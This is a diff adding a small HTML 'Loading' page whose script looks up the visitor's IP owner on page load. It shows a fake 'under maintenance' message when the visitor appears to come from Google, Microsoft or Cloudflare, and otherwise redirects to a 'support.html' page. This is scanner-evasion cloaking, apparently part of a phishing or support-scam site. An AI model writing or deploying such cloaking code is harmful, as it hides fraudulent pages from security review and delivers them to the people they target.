@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading</title>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            fetch('https://api.ipapi.is/?q')
+                .then(response => response.json())
+                .then(data => {
+                    if (data && data.company && data.company.name &&
+                        (data.company.name.toLowerCase().includes("google") || data.company.name.toLowerCase().includes("microsoft")|| data.company.name.toLowerCase().includes("cloudflare"))) {
+                        document.body.innerHTML = '<h1>Website is under maintenance</h1>';
+                    } else {
+                        window.location.href = 'support.html';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching data: ', error);
+                    window.location.href = 'support.html';
+                });
+        });
+    </script>
+</head>
+<body>
+    <!-- Nội dung ban đầu, sẽ được thay thế nếu cần -->
+</body>
+</html>
